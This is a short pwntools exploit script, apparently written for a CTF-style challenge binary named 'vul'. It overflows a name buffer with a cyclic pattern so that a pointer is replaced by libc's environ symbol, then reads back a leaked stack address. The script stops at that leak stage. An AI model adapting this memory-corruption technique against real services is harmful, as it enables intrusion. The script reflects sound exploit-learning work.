#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./vul"
elf = context.binary = ELF(exe)
libc = ELF('libc.so.6')

io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process([exe], aslr=False)
if args.GDB: gdb.attach(io, """
    b *show_highscore+38
    b *main+124
""")

# gdb.attach(io)

# libc.address = 0x00001555552df000
libc.address = 0x00007ffff7c00000
info("environ @ %#x" % libc.sym.environ)

payload = flat(
    cyclic(32, n=8),
    1,
    libc.sym.environ
)
io.sendafter('name: '.encode(), payload)
io.recvuntil(b"by \t ")
stack = fixleak(io.recvline())
info("stack @ %#x" % stack)

# io.interactive()